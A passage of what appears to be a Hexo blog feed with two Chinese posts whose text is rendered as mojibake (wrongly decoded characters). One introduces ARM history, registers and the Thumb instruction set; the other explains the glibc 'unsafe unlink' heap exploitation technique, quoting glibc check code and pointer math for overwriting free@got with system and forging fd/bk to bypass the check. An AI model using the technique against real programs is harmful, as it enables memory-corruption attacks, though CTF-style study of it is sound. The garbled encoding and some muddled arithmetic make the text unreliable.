        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ä»ARMçš„å‘å±•å²å¼€å§‹å­¦ARM</title>
      <link href="/2021/10/05/%E4%BB%8EARM%E7%9A%84%E5%8F%91%E5%B1%95%E5%8F%B2%E5%BC%80%E5%A7%8B%E5%AD%A6ARM/"/>
      <url>/2021/10/05/%E4%BB%8EARM%E7%9A%84%E5%8F%91%E5%B1%95%E5%8F%B2%E5%BC%80%E5%A7%8B%E5%AD%A6ARM/</url>
      
        <content type="html"><![CDATA[<h1 id="ä»ARMçš„å‘å±•å²å¼€å§‹å­¦ARM"><a href="#ä»ARMçš„å‘å±•å²å¼€å§‹å­¦ARM" class="headerlink" title="ä»ARMçš„å‘å±•å²å¼€å§‹å­¦ARM"></a>ä»ARMçš„å‘å±•å²å¼€å§‹å­¦ARM</h1><h2 id="èµ·æº"><a href="#èµ·æº" class="headerlink" title="èµ·æº"></a>èµ·æº</h2><p>ç¬¬ä¸€ä¸ªARMå¤„ç†å™¨æ˜¯1983å¹´10æœˆ-1985å¹´4æœˆé—´åœ¨è‹±å›½å‰‘æ¡¥çš„Acorn Computerå…¬å¸å¼€å‘çš„ã€‚é‚£æ—¶å€™ARMä»£è¡¨Acon RISC Machineå…¬å¸ï¼Œå¹¶ä¸€ç›´æŒç»­åˆ°Advanced RISC Machinelimited(ARM Limited)åœ¨1990å¹´æˆç«‹ä¹‹å‰ã€‚</p><p>Aconnå› ä¸ºBBC(è‹±å›½å¹¿æ’­å…¬å¸)å¾®å‹è®¡ç®—æœºçš„æˆåŠŸè€Œåœ¨è‹±å›½ä¸ªäººè®¡ç®—æœºå¸‚åœºå æ®äº†å¼ºæœ‰åŠ›çš„ä½ç½®ã€‚BBCå¾®å‹è®¡ç®—æœºæ˜¯ä»¥8ä½6502å¾®å¤„ç†å™¨ä¸ºæ ¸å¿ƒçš„æœºå™¨ã€‚</p><p>éšç€BBCåœ¨1982å¹´1æœˆä¸€ç³»åˆ—ç”µè§†èŠ‚æ—¥çš„ä»‹ç»ï¼Œå®ƒè¿…é€Ÿæˆä¸ºè‹±å›½å­¦æ ¡çš„ä¸»æµæœºå™¨ã€‚å®ƒè¿˜åœ¨è®¡ç®—<br>æœºçˆ±å¥½è€…çš„å¸‚åœºä¸Šäº«æœ‰çƒ­çƒˆçš„æ”¯æŒï¼Œå¹¶æ‰¾åˆ°äº†è¿›äººâ€“äº›ç ”ç©¶æ€§å®éªŒå®¤å’Œé«˜ç­‰æ•™è‚²ç»„ç»‡çš„é€”å¾„ã€‚<br>éšç€BBCå¾®æœºçš„æˆåŠŸï¼ŒAcornçš„å·¥ç¨‹å¸ˆè€ƒè™‘ç”¨ä¸åŒçš„å¾®å¤„ç†å™¨å»æ„é€ å¦ä¸€ç§æœºå™¨ã€‚ä»–ä»¬å‘ç°æ‰€æœ‰çš„å•†ä¸šä¾›è´§å‡ä¸å……è¶³ã€‚1983å¹´å¯å¾—åˆ°çš„16ä½CISCå¾®å¤„ç†å™¨æ¯”æ ‡å‡†çš„å­˜å‚¨å™¨éƒ¨ä»¶è¿˜æ…¢ã€‚å®ƒä»¬ä¹Ÿæœ‰ä¸€äº›å¤šæ—¶é’Ÿå‘¨æœŸå®Œæˆçš„æŒ‡ä»¤(åœ¨ä¸€äº›æƒ…å†µä¸‹ï¼Œéœ€è¦æ•°ç™¾ä¸ªæ—¶é’Ÿå‘¨æœŸ),ä½¿å…¶æœ‰å¾ˆé•¿çš„ä¸­æ–­ç­‰å¾…æ—¶é—´ã€‚BBCå¾®æœºå¾ˆå¤§ç¨‹åº¦ä¸Šå¾—ç›Šäº6502çš„å¿«é€Ÿä¸­æ–­å“åº”ã€‚å› æ­¤ï¼ŒAcornçš„è®¾è®¡è€…ä¸æ„¿æ„æ¥å—å¤„ç†å™¨æ€§èƒ½æ–¹é¢çš„é€€æ­¥ã€‚<br>ç”±äºåœ¨å•†ä¸šå¾®å¤„ç†å™¨çš„ä¾›è´§æ–¹é¢é­å—çš„è¿™äº›æŒ«æŠ˜ï¼Œä¸“æœ‰å¾®å¤„ç†å™¨çš„è®¾è®¡è¢«æåˆ°è®®<br>äº‹æ—¥ç¨‹ã€‚ä¸»è¦çš„éšœç¢æ˜¯Acornå°ç»„çŸ¥é“å•†ä¸šå¾®å¤„ç†å™¨éœ€è¦èŠ±è´¹æ•°ç™¾ä¸ªäººå¹´çš„è®¾è®¡åŠªåŠ›ã€‚Acornä¸å¯èƒ½æŒ‡æœ›è¿™æ ·è§„æ¨¡çš„æŠ•èµ„,å› ä¸ºå®ƒæ˜¯ä¸€ä¸ªæ€»å…±ä»…æœ‰400å¤šé›‡å‘˜çš„å…¬å¸ã€‚ä»–ä»¬å¿…é¡»ç”¨å°‘é‡çš„è®¾è®¡æˆæœ¬ç”Ÿæˆ·å‡ºæ¯”è¾ƒå¥½çš„äº§å“ï¼Œè€Œä¸”é™¤äº†ä¸ºBBCå¾®æœºè®¾è®¡è¿‡å°‘é‡çš„å°è§„æ¨¡é—¨é˜µåˆ—ä¹‹å¤–å®ƒä»¬åœ¨å…¨å®šåˆ¶èŠ¯ç‰‡è®¾è®¡æ–¹é¢æ²¡æœ‰ä»»ä½•ç»éªŒã€‚<br>åœ¨è¿™æ˜æ˜¾ä¸å¯èƒ½çš„æƒ…å†µä¸‹ï¼Œä¼¯å…‹åˆ©RISCIçš„è®ºæ–‡å¸¦æ¥ä¸€çº¿ç”Ÿæœºã€‚å®ƒæ˜¯ç”±å°‘æ•°ç ”ç©¶ç”Ÿåœ¨ä¸€å¹´å†…è®¾è®¡å®Œæˆçš„å¤„ç†å™¨ï¼Œå“è´¨ä¸é¢†å…ˆçš„å•†ä¸šè´§æºä¸ç›¸ä¸Šä¸‹ã€‚å®ƒçš„ç»“æ„ç®€å•ï¼Œå› è€Œ<br>æ²¡æœ‰å¤æ‚çš„æŒ‡ä»¤æ¥æŸå®³ä¸­æ–­æ‰§è¡Œæ—¶é—´ã€‚è¿˜æœ‰ã€‚äº›æ”¯æŒçš„è®ºæ®ï¼Œè®¤ä¸ºå®ƒèƒ½æŒ‡å¼•æœªæ¥çš„é“<br>è·¯ï¼Œè™½ç„¶æŠ€æœ¯çš„ä¼˜ç‚¹ä¸è®ºæ€æ ·å¾—åˆ°å­¦æœ¯ç•Œçš„æ”¯æŒä¹Ÿä¸èƒ½ä¿è¯å•†ä¸šçš„æˆåŠŸã€‚<br>ARMç”±äºå„ç§å› ç´ çš„å¶ç„¶ç»„åˆè€Œè¯ç”Ÿï¼Œæˆä¸ºAcornäº§å“çº¿çš„æ ¸å¿ƒéƒ¨åˆ†ã€‚åæ¥ï¼Œåœ¨æ˜æ™ºåœ°å°†ç¼©å†™å­—ARMçš„æ„ä¹‰ä¿®æ”¹ä¸ºAdvanced RISC Machineä»¥åï¼Œå®ƒæŠŠå®ƒçš„åå­—å€Ÿç»™æ–°ç»„æˆçš„å…¬å¸å»åœ¨Acornçš„äº§å“èŒƒå›´ä¹‹å¤–æ‰©å±•å¸‚åœºã€‚å°½ç®¡åç§°å˜åŒ–äº†,ä½“ç³»ç»“æ„ä»ä¿æŒåŒåŸAcornçš„è®¾è®¡ç›¸è¿‘ã€‚</p><p><a href="https://zhuanlan.zhihu.com/p/370771150">ARMèŠ¯ç‰‡çš„å‘å±•å†å²</a></p><p><a href="https://zhuanlan.zhihu.com/p/198903715">ARMå‘å®¶å²ï¼Œä¸€å®¶æ— åå…¬å¸çš„é€†è¢­</a></p><h2 id="ARMèŠ¯ç‰‡çš„å‘½å"><a href="#ARMèŠ¯ç‰‡çš„å‘½å" class="headerlink" title="ARMèŠ¯ç‰‡çš„å‘½å"></a>ARMèŠ¯ç‰‡çš„å‘½å</h2><p>ARMçš„èŠ¯ç‰‡æœ‰å‡ ç§ç‰ˆæœ¬å·</p><ul><li>ARMå†…æ ¸ç‰ˆæœ¬å·</li><li>ARM SoCçš„ç‰ˆæœ¬å·</li><li>èŠ¯ç‰‡çš„å‹å·</li></ul><h2 id="ARMæ¶æ„å¯„å­˜å™¨ä»‹ç»"><a href="#ARMæ¶æ„å¯„å­˜å™¨ä»‹ç»" class="headerlink" title="ARMæ¶æ„å¯„å­˜å™¨ä»‹ç»"></a>ARMæ¶æ„å¯„å­˜å™¨ä»‹ç»</h2><h4 id="32ä½"><a href="#32ä½" class="headerlink" title="32ä½"></a>32ä½</h4><p>32ä½çš„ARMæœ‰16ä¸ªå¯„å­˜å™¨ï¼ˆä¸åŒ…å«æ ‡å¿—ä½å¯„å­˜å™¨ï¼‰ï¼Œé€šå¸¸R0~R10éƒ½æ˜¯é€šç”¨å¯„å­˜å™¨ï¼Œè€Œå…¶ä»–çš„å¯„å­˜å™¨éƒ½æ˜¯æœ‰ç‰¹å®šåŠŸèƒ½çš„å¯„å­˜å™¨ï¼Œç›¸æ¯”ä¹‹ä¸‹X86åªæœ‰9ä¸ªå¯„å­˜å™¨</p><ol><li>R0~R3ç”¨ä½œ<strong>ä¼ é€’å‚æ•°</strong>çš„ï¼Œå¦‚æœå‚æ•°å¤§äº4ä¸ªå°±ç”¨æ ˆæ¥ä¼ é€’ï¼Œåœ¨X86æ¶æ„ä¸‹çš„ä¼ é€’å‚æ•°æ˜¯é€šè¿‡æ ˆæ¥å®Œæˆçš„ï¼Œåœ¨X86-64ä¸‹æ‰ç”¨6ä¸ªå¯„å­˜å™¨æ¥ä¼ é€’å‚æ•°ï¼ŒR0æ˜¯å‡½æ•°çš„è¿”å›å€¼ï¼Œå’ŒRAXå·®ä¸å¤š</li><li>R4~R11æ˜¯ä¿æŒå±€éƒ¨å˜é‡çš„å¯„å­˜å™¨ï¼Œä¹Ÿå°±æ˜¯è¯´<strong>å­ç¨‹åºåœ¨è¿è¡ŒæœŸé—´è‹¥è¦ä½¿ç”¨è¿™äº›å¯„å­˜å™¨åœ¨è¿›å…¥çš„æ—¶å€™è¦ä¿å­˜è¿™ç±»å¯„å­˜å™¨çš„å€¼</strong>ï¼ŒR7å­˜æ”¾äº†<strong>ç³»ç»Ÿè°ƒç”¨å·</strong>ï¼ŒR11æ˜¯BP</li><li>R12æ˜¯<strong>è¿‡ç¨‹è°ƒç”¨ä¸­é—´ä¸´æ—¶å¯„å­˜å™¨</strong>ï¼Œå«åšIPï¼ŒR13æ˜¯SPï¼ˆæ ˆæŒ‡é’ˆï¼‰ï¼ŒR14<strong>æ˜¯è¿æ¥å¯„å­˜å™¨ï¼Œå«åšLRï¼Œä¿æŒå­ç¨‹åºçš„è¿”å›åœ°å€</strong>ï¼ŒR15å°±æ˜¯ç¨‹åºè®¡æ•°å™¨ï¼ˆPCï¼‰ï¼Œ<strong>å­˜å‚¨å½“å‰æŒ‡ä»¤çš„åœ°å€åŠ 8ï¼ˆä¸¤ä¸ªARMæŒ‡ä»¤ï¼‰ï¼Œåœ¨Thumbï¼ˆv1ï¼‰çŠ¶æ€ä¸‹å­˜å‚¨å½“å‰æŒ‡ä»¤çš„åœ°å€åŠ 4ï¼ˆä¸¤ä¸ªThumbæŒ‡ä»¤ï¼‰ã€‚è¿™ä¸x86ä¸åŒï¼Œx86ä¸­PCå§‹ç»ˆæŒ‡å‘è¦æ‰§è¡Œçš„ä¸‹ä¸€æ¡æŒ‡ä»¤</strong></li></ol><img src="/2021/10/05/%E4%BB%8EARM%E7%9A%84%E5%8F%91%E5%B1%95%E5%8F%B2%E5%BC%80%E5%A7%8B%E5%AD%A6ARM/1.png" class=""><p>å’ŒX86ç›¸æ¯”ï¼Œæœ‰å‡ ç‚¹ä¸åŒä¹‹å¤„ï¼š</p><ol><li>32ä½å°±å·²ç»å¼€å§‹ç”¨å¯„å­˜å™¨ä¼ é€’å‚æ•°</li><li>æœ‰ä¸“é—¨çš„å¯„å­˜å™¨æ˜¯å­˜å‚¨ç³»ç»Ÿè°ƒç”¨å·çš„</li><li>å¤šäº†ä¸¤ä¸ªå…³äºå­ç¨‹åºçš„å¯„å­˜å™¨R12å’ŒR14</li></ol><img src="/2021/10/05/%E4%BB%8EARM%E7%9A%84%E5%8F%91%E5%B1%95%E5%8F%B2%E5%BC%80%E5%A7%8B%E5%AD%A6ARM/2.png" class=""><h4 id="64ä½"><a href="#64ä½" class="headerlink" title="64ä½"></a>64ä½</h4><p>å’Œ32ä½å¤§å·®ä¸å·®ï¼Œå°±æ˜¯æŠŠRæ¢æˆäº†Xï¼Œä½æ•°ç¿»å€å¹¶åŠ å¤šäº†ä¸€äº›å¯„å­˜å™¨</p><img src="/2021/10/05/%E4%BB%8EARM%E7%9A%84%E5%8F%91%E5%B1%95%E5%8F%B2%E5%BC%80%E5%A7%8B%E5%AD%A6ARM/image-20210902171755319.png" class="" title="image-20210902171755319"><h2 id="ARMæ±‡ç¼–æŒ‡ä»¤"><a href="#ARMæ±‡ç¼–æŒ‡ä»¤" class="headerlink" title="ARMæ±‡ç¼–æŒ‡ä»¤"></a>ARMæ±‡ç¼–æŒ‡ä»¤</h2><h2 id="ARMç‰¹è‰²"><a href="#ARMç‰¹è‰²" class="headerlink" title="ARMç‰¹è‰²"></a>ARMç‰¹è‰²</h2><h4 id="æŒ‡ä»¤å®šé•¿"><a href="#æŒ‡ä»¤å®šé•¿" class="headerlink" title="æŒ‡ä»¤å®šé•¿"></a>æŒ‡ä»¤å®šé•¿</h4><h4 id="Thumb"><a href="#Thumb" class="headerlink" title="Thumb"></a>Thumb</h4><p>Thumbæ˜¯ARMçš„å¦ä¸€ä¸ªæŒ‡ä»¤é›†ï¼Œä¹Ÿå°±æ˜¯è¯´ARMå’ŒIntelçš„æŒ‡ä»¤é›†ä¸åŒï¼Œå®ƒæœ‰ä¸¤å¥—æŒ‡ä»¤é›†ï¼Œä¸€ä¸ªæ˜¯å‰é¢è¯´çš„Thumbï¼Œå¦ä¸€ä¸ªå°±æ˜¯ä¼ ç»Ÿçš„ARMæŒ‡ä»¤é›†ï¼Œå®ƒä»¬ä¸¤ä¸ªä¸åŒçš„åœ°æ–¹å°±åœ¨äºæŒ‡ä»¤çš„é•¿åº¦ä¸åŒï¼ŒThumb æŒ‡ä»¤æ¯æ¡ 16 ä½é•¿ï¼Œå¹¶æœ‰ç›¸åº”çš„ 32 ä½ ARM æŒ‡ä»¤ï¼Œè€Œä¼ ç»Ÿçš„ARMéƒ½æ˜¯32ä½çš„ï¼Œæ‰€ä»¥Thumbæ˜¯2å­—èŠ‚çš„æŒ‡ä»¤ï¼Œä¼ ç»Ÿçš„ARMæ˜¯å››å­—èŠ‚çš„ï¼Œéœ€è¦æ³¨æ„çš„æ˜¯å½“æ ‡å¿—ä½å¯„å­˜å™¨å½“ä¸­çš„ç¬¬5ä½ä¸º1æ—¶æ˜¯Thumbæ¨¡å¼</p><img src="/2021/10/05/%E4%BB%8EARM%E7%9A%84%E5%8F%91%E5%B1%95%E5%8F%B2%E5%BC%80%E5%A7%8B%E5%AD%A6ARM/4.png" class=""><p><a href="https://www.cnblogs.com/zhangshenghui/p/5944964.html">ARMç¨‹åºçŠ¶æ€å¯„å­˜å™¨</a></p><p><a href="https://www.embedded.com/introduction-to-arm-thumb/">ä»‹ç» ARM ä¸­çš„thumb</a></p><p>å®ƒä¸ºå•¥éœ€è¦ä¸¤ä¸ªæŒ‡ä»¤é›†å‘€ï¼Ÿåœ¨è¿™å°±è¦å¼•å…¥ä¸€ä¸ªæ¦‚å¿µ**â€ä»£ç å¯†åº¦â€**ï¼Œæˆ‘ä»¬éƒ½çŸ¥é“ARMæ¶æ„åƒå¥½ä¸‡å¥½ï¼Œå…¶æœ¬è´¨è¿˜æ˜¯RISCå†³å®šçš„ï¼Œä½†æ˜¯å®ƒæœ‰ä¸€ä¸ªå¾ˆè¦å‘½çš„ç¼ºç‚¹ï¼Œå°±æ˜¯å’ŒCISCç›¸æ¯”RISCçš„ä»£ç å¯†åº¦ä½ï¼Œå…¶ä»£ç å¯†åº¦ä½æ˜¯æŒ‡ä»¤å®šé•¿çš„ç¼˜æ•…ï¼Œä»£ç å¯†åº¦ä½ä¼šå¯¼è‡´ä»»ä½•æ—¶å€™åªæœ‰å°‘éƒ¨åˆ†æŒ‡ä»¤è¢«åŠ è½½è¿›Cacheï¼Œè¿™å°±æ„å‘³ç€Cacheçš„å‘½ä¸­ç‡å¤§å¹…åº¦é™ä½ï¼Œè¿™æ—¶å€™CPUçš„å·¥ä½œæ•ˆç‡å°±ä¼šæ˜æ˜¾å‡å¼±ï¼Œä¸æ­¤åŒæ—¶åŠŸè€—ä¹Ÿä¼šå¢åŠ ï¼Œæœ€åˆè§£å†³è¿™ä¸ªé—®é¢˜çš„æ–¹æ³•ä¹Ÿå¾ˆç®€å•ï¼Œå°±æ˜¯å¢åŠ å®ƒçš„å¸¦å®½ï¼Œä½†æœ‰ä¸ªæ›´å¥½çš„åŠæ³•å°±æ˜¯Thumbï¼ŒThumbæŒ‡ä»¤é›†æ˜¯ä¼ ç»ŸARMæŒ‡ä»¤é›†çš„å‹ç¼©ç‰ˆï¼Œä½†å®ƒè¿˜æ˜¯æœ‰ä¿ç•™ä¸€ä¸‹ä¼ ç»ŸARMæŒ‡ä»¤é›†çš„æŒ‡ä»¤ï¼Œå¹¶åŠ å…¥åŠ¨æ€è§£å‹ç¼©è½¯ä»¶ï¼Œä½¿å¾—ä»£ç å¯†åº¦çš„é—®é¢˜å¾—åˆ°äº†è§£å†³</p>]]></content>
      
      
      
        <tags>
            
            <tag> ARM!ARM!ARM! </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>unsafe unlink</title>
      <link href="/2021/10/05/unsafe-unlink/"/>
      <url>/2021/10/05/unsafe-unlink/</url>
      
        <content type="html"><![CDATA[<blockquote><p>ä»¥å‰ä¸€ç›´æä¸æ˜ç™½<code>unlink</code>ï¼Œç›´åˆ°å­¦äº†ç‚¹æ•°æ®ç»“æ„â€¦.</p></blockquote><p><code>unlink</code>åˆ†ä¸º<strong>å‘å‰åˆå¹¶</strong>å’Œ<strong>å‘ååˆå¹¶</strong>ä¸¤ç§è„±é“¾æ–¹å¼ï¼Œæ˜¯ä¸ºäº†å‡å°‘å †å—çš„ç¢ç‰‡åŒ–æ‰€æå‡ºçš„ï¼Œå½“ä¸€ä¸ªå¤„äºfreeçŠ¶æ€çš„å †å—çš„å‰åå †å—è¢«<code>free</code>çš„æ—¶å€™ï¼Œå°±æ˜¯è§¦å‘<code>unlink</code>æœºåˆ¶å°†ä¸¤ä¸ªå°çš„å †å—åˆå¹¶æˆä¸€ä¸ªå¤§çš„å †å—ï¼Œ<code>unsafe unlink</code>é—®é¢˜å°±æ˜¯å‡ºç°åœ¨åˆå¹¶çš„æ—¶å€™æ£€æŸ¥æ²¡æœ‰åˆ°ä½å¯¼è‡´çš„</p><p>wikiä¸Šçš„è„±é“¾ç¤ºæ„å›¾ï¼Œå½“è¿›è¡Œè„±é“¾çš„æ—¶å€™FDçš„<code>bk</code>æŒ‡å‘BKï¼ŒBKçš„<code>fd</code>æŒ‡å‘FD</p><img src="/2021/10/05/unsafe-unlink/1.png" class=""><p>ä½†æ˜¯<code>unlink</code>ä¹Ÿä¸æ˜¯éšä¾¿è¿›è¡Œçš„ï¼Œè¿˜éœ€è¦é€šè¿‡ä¸‹é¢çš„æ£€æŸ¥æ‰èƒ½è¿›è¡Œ<code>unlink</code>ï¼Œä½†åœ¨å¾ˆæ—©ä»¥å‰ï¼Œå®ƒå¹¶æ²¡æœ‰è¿™ç§æœºåˆ¶ï¼Œæˆ‘ä»¬å…ˆé€šè¿‡ä»‹ç»æ²¡æœ‰æ£€æŸ¥çš„æƒ…å†µï¼Œç„¶ååœ¨æ­¤åŸºç¡€ä¸Šè¿›è¡Œä¿®æ”¹ï¼Œå®ç°ç°åœ¨çš„<code>unlink</code>æ”»å‡»æ‰‹æ³•</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ç”±äº P å·²ç»åœ¨åŒå‘é“¾è¡¨ä¸­ï¼Œæ‰€ä»¥æœ‰ä¸¤ä¸ªåœ°æ–¹è®°å½•å…¶å¤§å°ï¼Œæ‰€ä»¥æ£€æŸ¥ä¸€ä¸‹å…¶å¤§å°æ˜¯å¦ä¸€è‡´(sizeæ£€æŸ¥)</span></span><br><span class="line"><span class="keyword">if</span> (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), <span class="number">0</span>))      </span><br><span class="line">      malloc_printerr (<span class="string">&quot;corrupted size vs. prev_size&quot;</span>);               </span><br><span class="line"><span class="comment">// æ£€æŸ¥ fd å’Œ bk æŒ‡é’ˆ(åŒå‘é“¾è¡¨å®Œæ•´æ€§æ£€æŸ¥)</span></span><br><span class="line"><span class="keyword">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, <span class="number">0</span>))                      </span><br><span class="line">  malloc_printerr (check_action, <span class="string">&quot;corrupted double-linked list&quot;</span>, P, AV);  </span><br><span class="line"></span><br><span class="line"><span class="comment">// largebin ä¸­ next_size åŒå‘é“¾è¡¨å®Œæ•´æ€§æ£€æŸ¥ </span></span><br><span class="line">              <span class="keyword">if</span> (__builtin_expect (P-&gt;fd_nextsize-&gt;bk_nextsize != P, <span class="number">0</span>)              </span><br><span class="line">                || __builtin_expect (P-&gt;bk_nextsize-&gt;fd_nextsize != P, <span class="number">0</span>))    </span><br><span class="line">              malloc_printerr (check_action,                                      </span><br><span class="line">                               <span class="string">&quot;corrupted double-linked list (not small)&quot;</span>,    </span><br><span class="line">                               P, AV);</span><br></pre></td></tr></table></figure><h4 id="ä»¥å‰çš„unlink"><a href="#ä»¥å‰çš„unlink" class="headerlink" title="ä»¥å‰çš„unlink"></a>ä»¥å‰çš„unlink</h4><p>ä»¥32ä½ç¨‹åºä¸ºä¾‹</p><p>å‡è®¾ç”³è¯·äº†ä¸‰ä¸ªå †å—ï¼Œå¹¶å­˜åœ¨å †æº¢å‡ºï¼Œæˆ‘ä»¬å…ˆå°†<code>chunk 2</code>ç»™<code>free</code>æ‰ï¼Œç„¶ååˆ©ç”¨å †æº¢å‡ºè¦†ç›–<code>fd</code>å’Œ<code>bk</code></p><p>æˆ‘ä»¬å›å¿†ä¸€ä¸‹ï¼Œ<code>unlink</code>ä¼šæ‰§è¡Œå•¥</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">FD = P -&gt; fd = free@got - 12</span><br><span class="line"></span><br><span class="line">BK = P -&gt; bk = system@got</span><br><span class="line"></span><br><span class="line">FD -&gt; bk = BK =&gt; (free@got - 12) + 12 = system@got</span><br><span class="line"></span><br><span class="line">BK -&gt; fd = FD =&gt; system@got + 8 = free@got</span><br></pre></td></tr></table></figure><p>æ‰§è¡Œå®Œä¹‹åï¼Œ<code>free@got</code>å°±å˜æˆäº†<code>system@got</code>ï¼Œè¿˜è¦ä¸€ç‚¹éœ€è¦æ³¨æ„çš„æ˜¯<code>system@got + 8 = free@got</code>ï¼Œå¦‚æœæ²¡æœ‰æ”¹å›æ¥æœ‰å¯èƒ½ä¼šå‘é€ä¸€ä¸‹å¥‡å¥‡æ€ªæ€ªçš„äº‹æƒ…</p><img src="/2021/10/05/unsafe-unlink/2.png" class=""><h4 id="ç›®å‰çš„unlink"><a href="#ç›®å‰çš„unlink" class="headerlink" title="ç›®å‰çš„unlink"></a>ç›®å‰çš„unlink</h4><p>è®²å®Œæ²¡æœ‰æ£€æŸ¥çš„æƒ…å†µï¼Œæ¥ä¸‹æ¥å°±æ˜¯æœ‰æ£€æŸ¥çš„æƒ…å†µäº†ï¼Œå®ƒåªè¦æ£€æŸ¥çš„æ˜¯<code>FD-&gt;bk != P || BK-&gt;fd != P</code></p><p>åªè¦ç»•è¿‡è¿™ä¸ªæ£€æŸ¥å°±å¯ä»¥äº†</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">FD -&gt; bk = BK =&gt; (free@got - 12) + 12</span><br><span class="line"></span><br><span class="line">BK -&gt; fd = FD =&gt; system@got + 8</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬çœ‹çœ‹åˆšåˆšçš„è½¬æ¢ï¼Œæ˜æ˜¾ä¸ç›¸ç­‰ï¼Œæ˜¯å§ï¼</p><p>é‚£æŒ‰ç…§è¿™ä¸ªæ£€æŸ¥ï¼Œæˆ‘ä»¬å°±å¯ä»¥è¿›è¡Œä¼ªé€ ï¼Œè¿™æ ·ä¸€æ¥å°±ç›¸ç­‰äº†å¯¹å§ï¼</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">FD -&gt; bk =&gt; (p - 12) + 12 = p</span><br><span class="line"></span><br><span class="line">BK -&gt; fd =&gt; (p - 8) + 8 = p</span><br></pre></td></tr></table></figure><p>é‚£ä¹ˆæœ€ç»ˆå®ç°çš„æ•ˆæœå°±æ˜¯ï¼Œè·Ÿåˆšåˆšçš„ç›´æ¥ä¿®æ”¹GOTè¡¨ç›¸æ¯”ï¼Œåªæ˜¯ä¿®æ”¹äº†<code>chunk</code>çš„æŒ‡é’ˆï¼Œåå·®æœ‰ç‚¹å¤§ï¼Œä½†æ˜¯å®ƒè¿˜æ˜¯æœ‰å®ƒçš„æ”»å‡»æ•ˆæœçš„</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(p - 8) + 8 = p - 12</span><br></pre></td></tr></table></figure><p>ä¾‹é¢˜ä¸º<strong>2016 ZCTF note2</strong>ï¼Œå‚è€ƒã€Š<code>buu</code>åˆ·é¢˜è®°ä¹‹PWNç³»åˆ—ã€‹å‘å‰å’Œå‘ååˆå¹¶çš„æºç è§£æéƒ½åœ¨é‚£ï¼Œè¿™é‡Œå°±ä¸èµ˜è¿°äº†ï¼</p><h4 id="å®Œæ•´æºç åˆ†æ"><a href="#å®Œæ•´æºç åˆ†æ" class="headerlink" title="å®Œæ•´æºç åˆ†æ"></a>å®Œæ•´æºç åˆ†æ</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> unlink(AV, P, BK, FD) &#123;</span></span><br><span class="line"><span class="comment">//æ£€æŸ¥chunkçš„sizeå¦‚æœå’Œnextchunkçš„prev_sizeä¸ç›¸ç­‰å°±æŠ¥é”™</span></span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), <span class="number">0</span>))      </span><br><span class="line">        malloc_printerr (<span class="string">&quot;corrupted size vs. prev_size&quot;</span>);                              </span><br><span class="line">    FD = P-&gt;fd;                                                                     </span><br><span class="line">    BK = P-&gt;bk;                                                                      </span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, <span class="number">0</span>))                      </span><br><span class="line">        malloc_printerr (<span class="string">&quot;corrupted double-linked list&quot;</span>);                           </span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        </span><br><span class="line">        FD-&gt;bk = BK;                                                              </span><br><span class="line">        BK-&gt;fd = FD;</span><br><span class="line">        <span class="comment">//ä¸‹é¢æ˜¯largechunkçš„æ£€æŸ¥   </span></span><br><span class="line">        <span class="keyword">if</span> (!in_smallbin_range (chunksize_nomask (P))                             </span><br><span class="line">            &amp;&amp; __builtin_expect (P-&gt;fd_nextsize != <span class="literal">NULL</span>, <span class="number">0</span>)) &#123;                      </span><br><span class="line">            <span class="keyword">if</span> (__builtin_expect (P-&gt;fd_nextsize-&gt;bk_nextsize != P, <span class="number">0</span>)              </span><br><span class="line">                || __builtin_expect (P-&gt;bk_nextsize-&gt;fd_nextsize != P, <span class="number">0</span>))    </span><br><span class="line">                malloc_printerr (<span class="string">&quot;corrupted double-linked list (not small)&quot;</span>);   </span><br><span class="line">            <span class="keyword">if</span> (FD-&gt;fd_nextsize == <span class="literal">NULL</span>) &#123;                                      </span><br><span class="line">                <span class="keyword">if</span> (P-&gt;fd_nextsize == P)                                      </span><br><span class="line">                    FD-&gt;fd_nextsize = FD-&gt;bk_nextsize = FD;                      </span><br><span class="line">                <span class="keyword">else</span> &#123;                                                              </span><br><span class="line">                    FD-&gt;fd_nextsize = P-&gt;fd_nextsize;                              </span><br><span class="line">                    FD-&gt;bk_nextsize = P-&gt;bk_nextsize;                              </span><br><span class="line">                    P-&gt;fd_nextsize-&gt;bk_nextsize = FD;                              </span><br><span class="line">                    